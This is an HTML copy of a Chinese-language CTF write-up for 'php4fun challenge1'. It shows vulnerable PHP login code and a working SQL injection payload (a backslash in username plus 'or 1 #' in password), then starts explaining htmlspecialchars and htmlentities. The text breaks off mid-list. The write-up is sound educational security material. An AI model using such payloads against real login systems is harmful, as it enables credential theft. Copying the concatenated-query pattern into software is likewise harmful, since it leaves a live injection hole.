<!DOCTYPE html>

<html lang="en">
<head>
<meta charset="utf-8"/>
<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
<meta content="IE=edge,chrome=1" http-equiv="X-UA-Compatible"/>
<title>php4fun challenge1 writeup</title>
<meta content="True" name="HandheldFriendly"/>
<meta content="320" name="MobileOptimized"/>
<meta content="yes" name="apple-mobile-web-app-capable"/>
<meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"/>
<meta content="width=device-width, initial-scale=1, maximum-scale=1" name="viewport"/>
<meta content="" name="description"/>
<meta content="summary" name="twitter:card"/>
<meta content="php4fun challenge1 writeup" name="twitter:title"/>
<meta content="" name="twitter:description"/>
<meta content="http://www.firesun.me" property="og:url"/>
<meta content="article" property="og:type"/>
<meta content="php4fun challenge1 writeup" property="og:title"/>
<meta content="" property="og:description"/>
<meta content="火日小站" property="og:site_name"/>
<meta content="php4fun challenge1 writeup" itemprop="name"/>
<meta content="" itemprop="description"/>
<meta content="" name="theme-color"/>
<link href="./php4fun challenge1 writeup/favicon.ico" rel="shortcut icon" type="image/x-icon"/>
<link href="./php4fun challenge1 writeup/apple-touch-icon-precomposed.png" rel="apple-touch-icon"/>
<link href="//fonts.googleapis.com/" rel="dns-prefetch"/>
<link href="//fonts.googleapis.com/css?family=Noto+Serif:400,700,400italic|Open+Sans:700,400&amp;subset=latin,latin-ext" rel="stylesheet"/>
<link href="./php4fun challenge1 writeup/main.min.cssv=92699c119f" rel="stylesheet">
<script src="./php4fun challenge1 writeup/jquery.min.js" type="text/javascript"></script>
<script type="text/javascript">
if (!window.jQuery) {
	var script = document.createElement('script');
	script.src = "/assets/js/jquery.min.js?v=92699c119f";
	document.body.appendChild(script);
}
var ga_ua = 'UA-XXXXX-X';

var disqus_shortname = 'firesun';

var enable_pjax = true;
// Pace Options
// ==============
window.paceOptions = {
	catchupTime: 100,
	minTime: 100,
	elements: false,
	restartOnRequestAfter: 500,
	startOnPageLoad: false
}
// Ghostium Globals
// ==============
window.GHOSTIUM = {};
GHOSTIUM.haveDisqus = typeof disqus_shortname !== 'undefined' && disqus_shortname !== 'example';
GHOSTIUM.enablePjax = typeof enable_pjax !== 'undefined' ? enable_pjax : true;
    </script>
<script src="./php4fun challenge1 writeup/head-scripts.min.jsv=92699c119f"></script>
<link href="./php4fun challenge1 writeup/php4fun-challenge1-writeup" rel="canonical">
<meta content="origin" name="referrer">
<meta content="火日小站" property="og:site_name">
<meta content="article" property="og:type">
<meta content="php4fun challenge1 writeup" property="og:title">
<meta content="php源代码 #GOAL: get password from admin; error_reporting(0);   require 'db.inc.php'; function clean($str){       if(get_magic_quotes_gpc()){         $str=stripslashes($str);     }     return htmlentities($str, ENT_QUOTES); } $username = @clean((string)$_GET['username']); $password = @clean((string)$_GET['password']); $query='SELECT * FROM users WHERE name=\''.$username.'\' AND" property="og:description">
<meta content="http://www.firesun.me/php4fun-challenge1-writeup/" property="og:url">
<meta content="2016-04-02T07:11:23.000Z" property="article:published_time">
<meta content="2016-04-18T12:11:48.000Z" property="article:modified_time">
<meta content="summary" name="twitter:card">
<meta content="php4fun challenge1 writeup" name="twitter:title">
<meta content="php源代码 #GOAL: get password from admin; error_reporting(0);   require 'db.inc.php'; function clean($str){       if(get_magic_quotes_gpc()){         $str=stripslashes($str);     }     return htmlentities($str, ENT_QUOTES); } $username = @clean((string)$_GET['username']); $password = @clean((string)$_GET['password']); $query='SELECT * FROM users WHERE name=\''.$username.'\' AND" name="twitter:description">
<meta content="http://www.firesun.me/php4fun-challenge1-writeup/" name="twitter:url">
<meta content="Written by" name="twitter:label1">
<meta content="火日攻天" name="twitter:data1">
<script type="application/ld+json">
{
    "@context": "http://schema.org",
    "@type": "Article",
    "publisher": "火日小站",
    "author": {
        "@type": "Person",
        "name": "火日攻天",
        "image": "http://www.firesun.me/content/images/2016/04/avatar.png",
        "url": "http://www.firesun.me/author/firesun/",
        "sameAs": "http://www.firesun.me/"
    },
    "headline": "php4fun challenge1 writeup",
    "url": "http://www.firesun.me/php4fun-challenge1-writeup/",
    "datePublished": "2016-04-02T07:11:23.000Z",
    "dateModified": "2016-04-18T12:11:48.000Z",
    "description": "php源代码 #GOAL: get password from admin; error_reporting(0);   require &#x27;db.inc.php&#x27;; function clean($str){       if(get_magic_quotes_gpc()){         $str=stripslashes($str);     }     return htmlentities($str, ENT_QUOTES); } $username = @clean((string)$_GET[&#x27;username&#x27;]); $password = @clean((string)$_GET[&#x27;password&#x27;]); $query=&#x27;SELECT * FROM users WHERE name=\\&#x27;&#x27;.$username.&#x27;\\&#x27; AND"
}
    </script>
<meta content="Ghost 0.7" name="generator">
<link href="./php4fun challenge1 writeup/rss" rel="alternate" title="火日小站" type="application/rss+xml">
<link href="./php4fun challenge1 writeup/zTreeStyle.css" rel="stylesheet" type="text/css"/>
</link></meta></meta></meta></meta></meta></meta></meta></meta></meta></meta></meta></meta></meta></meta></meta></link></link></head>
<body class="post-template">
<button class="drawer-button" data-action="open-drawer" id="drawer-button"><i class="fa fa-bars"></i></button>
<nav class="drawer" tabindex="-1">
<div class="drawer-container">
<!--.drawer-search(role="search")-->
<ul class="drawer-list" role="navigation">
<li class="drawer-list-item">
<a data-pjax="" href="/">
<i class="fa fa-home"></i>Home
  </a>
</li>
<li class="drawer-list-item">
<a data-pjax="" href="/tag/web">
<i class="fa fa-rocket"></i>Web
  </a>
</li>
<li class="drawer-list-item">
<a href="http://www.firesun.me/rss/">
<i class="fa fa-rss"></i>Subscribe to Feed
  </a>
</li>
<li class="drawer-list-divider"></li>
<li class="drawer-list-item drawer-list-title">
  Follow me
</li>
<li class="drawer-list-item">
<a href="http://twitter.com" target="_blank">
<i class="fa fa-twitter"></i>Twitter
  </a>
</li>
<li class="drawer-list-item">
<a href="http://github.com/firesunCN" target="_blank">
<i class="fa fa-github"></i>Github
  </a>
</li>
</ul>
</div>
</nav>
<div class="drawer-overlay"></div>
<main class="container" id="container" role="main">
<div class="surface">
<div class="surface-container">
<div class="content" data-pjax-container="">
<section class="wrapper wrapper-post">
<div class="wrapper-container">
<article class="post post" itemscope="" itemtype="http://schema.org/BlogPosting" role="article">
<section class="post-container">
<header class="post-header">
<ul class="post-meta-list">
<li class="post-meta-item">
<time datetime="2016-04-02" itemprop="datePublished">
                  a year ago
                </time>
</li>
<li class="post-meta-item">
<a data-disqus-identifier="8" href="#disqus_thread">Comments</a>
</li>
</ul>
<h1 class="post-title" itemprop="name headline"><a data-pjax="" href="/php4fun-challenge1-writeup/" itemprop="url" title="php4fun challenge1 writeup">php4fun challenge1 writeup</a></h1>
<!--h2 itemprop="about" class="post-subtitle"></h2-->
</header>
<aside class="post-side">
<div class="post-author">
<a class="post-author-avatar" href="http://www.firesun.me/">
<img alt="火日攻天" src="./php4fun challenge1 writeup/avatar.png"/>
</a>
<div class="post-author-info">
<a class="post-author-name" href="http://www.firesun.me/">
                  火日攻天
                </a>
<p class="post-author-bio"></p>
</div>
</div>
<ul class="ztree" id="tree" style="width:100%"></ul>
</aside>
<div class="post-body" itemprop="articleBody">
<h2 id="php">php源代码</h2>
<pre><code class="language-php">#GOAL: get password from admin;
error_reporting(0);  
require 'db.inc.php';

function clean($str){  
    if(get_magic_quotes_gpc()){
        $str=stripslashes($str);
    }
    return htmlentities($str, ENT_QUOTES);
}

$username = @clean((string)$_GET['username']);
$password = @clean((string)$_GET['password']);

$query='SELECT * FROM users WHERE name=\''.$username.'\' AND pass=\''.$password.'\';';
$result=mysql_query($query);
if(!$result || mysql_num_rows($result) &lt; 1){  
    die('Invalid password!');
}

$row = mysql_fetch_assoc($result);

echo "Hello ".$row['name']."&lt;/br&gt;";  
echo "Your password is:".$row['pass']."&lt;/br&gt;";  
</code></pre>
<h2 id="writeup">writeup</h2>
<p>很明显的注入题，username，password参数可控，使用htmlentities函数进行的输入净化，问题就出在htmlentities函数是用于输出编码，而非输入净化的。</p>
<p>htmlentities并没有过滤\导致可以废掉一个",配合注释符号就能实现SQL注入  </p>
<pre><code>index.php?username=\&amp;password= or 1 %23  (%23为#注释符的url编码)  
</code></pre>
<p>此时SQL语句为</p>
<pre><code class="language-sql">SELECT * FROM users WHERE name='\' AND pass=' or 1 #';  
</code></pre>
<p>等效</p>
<pre><code class="language-sql">SELECT * FROM users WHERE name='xxx' or 1 #  
</code></pre>
<p>问题解决了，不过我们还是来看看这一切是为什么。</p>
<p>我们首先来学习一下htmlentities函数与他的兄弟函数htmlspecialchars，然后在看看真正用于sql输入净化的mysql<em>real</em>escape_string函数，通过对比找到问题的所在。</p>
<h3 id="htmlspecialchars">htmlspecialchars</h3>
<p>顾名思义，针对特定的字符编码，来看看w3school的解释：</p>
<p>htmlspecialchars() 函数把预定义的字符转换为 HTML 实体。 <br/>
预定义的字符是：</p>
<pre><code class="language-txt">&amp; （与符号）成为 &amp;amp;
" （双引号） 成为 &amp;quot;
' （单引号） 成为 &amp;apos;  
&lt; （小于）成为 &amp;lt;  
&gt; （大于）成为 &amp;gt;
</code></pre>
<p>语法</p>
<pre><code class="language-php">htmlspecialchars(string,flags,character-set,double_encode)  
</code></pre>
<table>
<thead>
<tr>
<th id="参数" style="text-align:left;"> 参数</th>
<th id="描述" style="text-align:left;">  描述</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left;"><p>string</p></td>
<td style="text-align:left;"><p>必需。规定要转换的字符串。</p></td>
</tr>
<tr>
<td style="text-align:left;"><p>flags</p></td>
<td style="text-align:left;"><p>可选。规定如何处理引号、无效的编码以及使用哪种文档类型。</p></td>
</tr>
<tr>
<td style="text-align:left;"><p>character-set</p></td>
<td style="text-align:left;"><p>可选。一个规定了要使用的字符集的字符串。</p></td>
</tr>
<tr>
<td style="text-align:left;"><p>double_encode</p></td>
<td style="text-align:left;"><p>可选。布尔值，规定了是否编码已存在的 HTML 实体。</p></td>
</tr>
</tbody>
</table>
<p>这里解释一下flags，character-set，double_encode</p>
<h4 id="flag">flag</h4>
<p>用于配置是否编码引号，对无效编码的处理，以及规定使用的文档类型</p>
<p>可用的引号类型：</p>
<ul>
<li>ENT_COMPAT - 默认。仅编码双引号。</li>
<li>ENT_QUOTES - 编码双引号和单引号。</li>
<li>ENT_NOQUOTES - 不编码任何引号。</li>
</ul>
<p>无效的编码：</p>
<ul>
<li>ENT_IGNORE - 忽略无效的编码，而不是让函数返回一个空的字符串。应尽量避免，因为这可能对安全性有影响。</li>
<li>ENT_SUBSTITUTE - 把无效的编码替代成一个指定的带有 Unicode 替代字符 U+FFFD（UTF-8）或者 &amp;#</li></ul></div></section></article></div></section></div></div></div></main></body></html>